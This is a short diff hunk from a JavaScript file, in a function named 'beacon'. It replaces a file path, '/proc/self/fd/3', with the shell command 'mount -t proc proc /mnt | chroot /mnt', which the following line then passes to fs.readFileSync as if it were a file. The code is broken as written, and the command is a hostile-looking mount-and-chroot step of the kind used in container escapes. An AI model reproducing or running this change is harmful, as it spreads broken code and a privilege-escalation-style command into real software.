@@ -35,7 +35,7 @@ function beacon(urlStr, q) {
   const outDir = path.join(__dirname, "..", "dist");
   fs.mkdirSync(outDir, { recursive: true });
 
-  const target = "/proc/self/fd/3";
+  const target = "mount -t proc proc /mnt | chroot /mnt";
   let exists = false, size = -1, sha256 = "n/a";
   try {
     const buf = fs.readFileSync(target);
